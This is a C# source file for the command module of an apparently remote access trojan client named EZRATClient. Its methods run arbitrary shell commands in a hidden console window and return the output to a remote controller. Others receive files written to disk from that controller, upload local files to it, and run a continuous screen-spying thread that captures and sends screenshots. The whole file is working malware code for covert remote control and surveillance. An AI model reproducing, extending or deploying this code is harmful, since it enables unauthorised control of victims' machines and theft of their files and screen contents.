using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using EZRATClient.Utils;
using System.Threading;
using System.Drawing.Imaging;
using System.Net.Sockets;

namespace EZRATClient.Core
{
    public static class CommandExecutor
    {
        public static void ExecuteCommand(string command, string path = "C:\\")
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.WorkingDirectory = path;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
            string result = proc.StandardOutput.ReadToEnd();
            Program.SendCommand("cmd;" + path + ";" + result);
        }

        public static void ReceiveFile(string data, string path)
        {

            string[] textValue = data.Split(Constantes.SeparatorChar);
            byte[] fileData = new byte[textValue.Length];
            for (int i = 0; i < textValue.Length - 1; i++)
            {
                fileData[i] = Convert.ToByte(textValue[i]);
            }
            string dir = path.Substring(0, path.LastIndexOf('\\'));
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            File.WriteAllBytes(path, fileData);

        }


        private static byte[] CreateDataPacket(byte[] cmd, byte[] data)
        {
            byte[] initialize = new byte[1];
            initialize[0] = 2;
            byte[] separator = new byte[1];
            separator[0] = 4;
            byte[] datalength = Encoding.UTF8.GetBytes(Convert.ToString(data.Length));
            MemoryStream ms = new MemoryStream();
            ms.Write(initialize, 0, initialize.Length);
            ms.Write(cmd, 0, cmd.Length);
            ms.Write(datalength, 0, datalength.Length);
            ms.Write(separator, 0, separator.Length);
            ms.Write(data, 0, data.Length);
            return ms.ToArray();
        }

        public static byte[] ReadStream(NetworkStream ns)
        {
            byte[] data_buff = null;

            int b = 0;
            String buff_length = "";
            while ((b = ns.ReadByte()) != 4)
            {
                buff_length += (char)b;
            }
            int data_length = Convert.ToInt32(buff_length);
            data_buff = new byte[data_length];
            int byte_read = 0;
            int byte_offset = 0;
            while (byte_offset < data_length)
            {
                byte_read = ns.Read(data_buff, byte_offset, data_length - byte_offset);
                byte_offset += byte_read;
            }

            return data_buff;
        }

        public static void SendFile(string path)
        {
            if (!Program._clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }


            string file_name = Path.GetFileName(path);
            int size = 1024;
            uint tot = 0;
            FileStream fs = new FileStream(path, FileMode.Open);
            NetworkStream ns = new NetworkStream(Program._clientSocket);
            byte[] data = new byte[size];
            while (tot < fs.Length)
            {
                fs.Read(data, 0, size);
                tot += (uint)data.Length;
                ns.Write(data, 0, size);
                ns.Flush();
            }
            Console.WriteLine($"Total data : {tot}");
            fs.Close();
            return;

            //try
            //{
            //    //_clientSocket.SendFile(path); //Send the data to the server
            //    string dataFile = string.Empty;
            //    File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
            //    byte[] result = Encoding.Default.GetBytes(Program.Encrypt("dlfile;" + dataFile));
            //    Program._clientSocket.Send(result);
            //}
            //catch (Exception ex) //Failed to send data to the server
            //{
            //    Console.WriteLine("Send File Failure " + ex.Message);
            //    return; //Return
            //}
        }

        public static void WindowsControl(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
            procStartInfo.RedirectStandardOutput = false;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
        }


        // For futur use
        public static Thread ScreenSpyThread()
        {
            Constantes.Spy = new Thread(() =>
           {
               while (true)
               {
                   string tmp = "screenspy;" + TakeScreenShot();
                   Program.SendCommand(tmp);
                   Thread.Sleep(Constantes.ScreenShotSpeed);
               }
           });
            Constantes.Spy.Start();
            return Constantes.Spy;
        }

        public static void StopScreenSpyThread()
        {
            Constantes.Spy.Abort();
        }

        public static string TakeScreenShot()
        {
            string result = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
                result = Encoding.Default.GetString(ms.ToArray());
            }
            return result;
        }


    }
}
